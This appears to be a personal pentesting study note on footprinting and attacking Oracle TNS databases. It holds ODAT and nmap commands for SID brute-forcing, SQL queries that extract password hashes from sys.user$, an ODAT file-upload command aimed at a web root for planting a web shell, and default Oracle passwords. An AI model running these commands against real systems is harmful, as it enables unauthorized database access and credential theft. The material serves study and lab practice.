---
tags:
  - protocol
  - system
  - database
  - footprint
  - enumeration
cssclasses:
  - "[[Oracle TNS]]"
---
---
# Footprint
0. Odat tool && bruteforcing
```bash
./odat.py all -s <ip>
```

1. nmap:
```bash
sudo nmap -p1521 -sV <ip> --open --script oracle-sid-brute  # SID brute-force
```
2. sqlplus - direct connection
```bash
sqlplus <user>/<password>@<ip>/<SID>
```
https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985
```sql
select table_name from all_tables;       # enumeration
select * from user_role_privs;            # privilege check
select name, password from sys.user$;    # password extract
```

# WEB_SHELL - File upload

| default path         | OS      |
| -------------------- | ------- |
| `/var/www/html`      | Linux   |
| `C:\inetpub\wwwroot` | Windows |
File uploading:
```bash
./odat.py utlfile -s <ip> -d <..> -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt (for linux other path, check manual)
```

```bash
curl -X GET http://10.129.204.235/testing.txt  # trigerring
```
## Interesting Features
Oracle9 - default. password - `CHANGE_ON_INSTALL`
Oracle10 - no default password
Oracle DBSNMP - default pass. - `dbsnmp`